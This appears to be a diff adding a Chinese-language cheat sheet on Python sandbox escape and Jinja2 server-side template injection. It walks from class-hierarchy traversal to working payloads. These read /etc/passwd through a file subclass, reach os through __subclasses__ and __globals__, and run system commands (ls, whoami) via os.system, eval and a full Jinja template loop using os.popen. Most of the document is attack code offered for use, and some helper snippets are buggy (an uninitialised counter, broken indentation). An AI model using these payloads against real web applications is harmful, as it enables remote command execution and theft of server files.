@@ -1,0 +1,96 @@
+找到父类<type 'object'>-->寻找子类-->找关于命令执行或者文件操作的模块。
+
+几个魔术方法
+
+__class__  返回类型所属的对象
+__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。
+__base__   返回该对象所继承的基类
+// __base__和__mro__都是用来寻找基类的
+
+__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表
+__init__  类的初始化方法
+__globals__  对包含函数全局变量的字典的引用
+
+_builtin_ 内建函数，python中可以直接运行一些函数，例如int(),list()等等，这些函数可以在__builtins__中可以查到。查看的方法是dir(__builtins__)
+ ps：在py3中__builtin__被换成了builtin 
+ __builtin__ 和 __builtins__之间是什么关系呢？
+在主模块main中，__builtins__是对内建模块__builtin__本身的引用，即__builtins__完全等价于__builtin__，二者完全是一个东西，不分彼此。
+非主模块main中，__builtins__仅是对__builtin__.__dict__的引用，而非__builtin__本身
+=======================================================
+1 、获取字符串的类对象
+
+>>> ''.__class__
+<type 'str'>
+
+2 、寻找基类
+
+>>> ''.__class__.__mro__
+(<type 'str'>, <type 'basestring'>, <type 'object'>)
+
+3 、寻找可用引用
+
+>>> ''.__class__.__mro__[2].__subclasses__()
+#like:   <type 'dict'>, <type 'set'>
+#可用:    <type 'file'>
+
+4 、利用
+
+''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()
+
+
+5 、寻找包含os模块的脚本
+
+#!/usr/bin/env python
+# encoding: utf-8
+for item in ''.__class__.__mro__[2].__subclasses__():
+    try:
+         if 'os' in item.__init__.__globals__:
+             print num,item
+         num+=1
+    except:
+        print '-'
+        num+=1
+
+输出
+
+-
+71 <class 'site._Printer'>
+-
+-
+-
+-
+76 <class 'site.Quitter'>
+
+#!#################
+os就是“operating system”的缩写，顾名思义，os模块提供的就是各种 Python 程序与操作系统进行交互的接口。通过使用os模块，一方面可以方便地与操作系统进行交互，另一方面页可以极大增强代码的可移植性。如果该模块中相关功能出错，会抛出OSError异常或其子类异常。
+#################!#
+
+6、
+payload----->                            71 <class 'site._Printer'>
+''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].system('ls')
+                           OR  
+{{''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].listdir('.')}}
+
+etc..
+
+
+扩充（builtins）
+寻找方法：寻找builtins得到eval
+    for c in ().__class__.__bases__[0].__subclasses__():
+    try:
+        if '__builtins__' in c.__init__.__globals__.keys():
+            print(c.name)
+    except:
+        pass
+脚本不知道什么原因运行后也没有回显，找到了一个python2/3都有builtins的类 _IterationGuard。
+    for c in ().__class__.__bases__[0].__subclasses__():
+    if c.__name__=='_IterationGuard':
+        c.__init__.__globals__['__builtins__']['eval']("__import__('os').system('whoami')")
+
+notes:用jinja的语法即为（执行命令使用os.popen('whoami').read()才有执行结果的回显）
+        {% for c in [].__class__.__base__.__subclasses__() %}
+        {% if c.__name__=='_IterationGuard' %}
+        {{ c.__init__.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()") }}
+        {% endif %}
+        {% endfor %}
+
